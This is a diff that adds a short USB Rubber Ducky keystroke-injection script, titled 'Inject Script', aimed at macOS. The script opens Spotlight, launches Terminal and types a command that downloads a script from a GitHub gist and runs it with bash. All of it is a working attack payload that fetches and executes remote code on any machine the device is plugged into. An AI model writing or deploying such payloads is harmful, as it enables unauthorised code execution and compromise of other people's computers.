@@ -1,0 +1,12 @@
+REM Thnkr
+REM Inject Script
+DELAY 1000
+GUI SPACE
+DELAY 700
+STRING terminal
+DELAY 700
+ENTER
+DELAY 1000
+STRING bash <(curl -s https://gist.githubusercontent.com/thnkr/04ee7aa7585ef323eaa1/raw/ducky.sh)
+DELAY 500
+ENTER
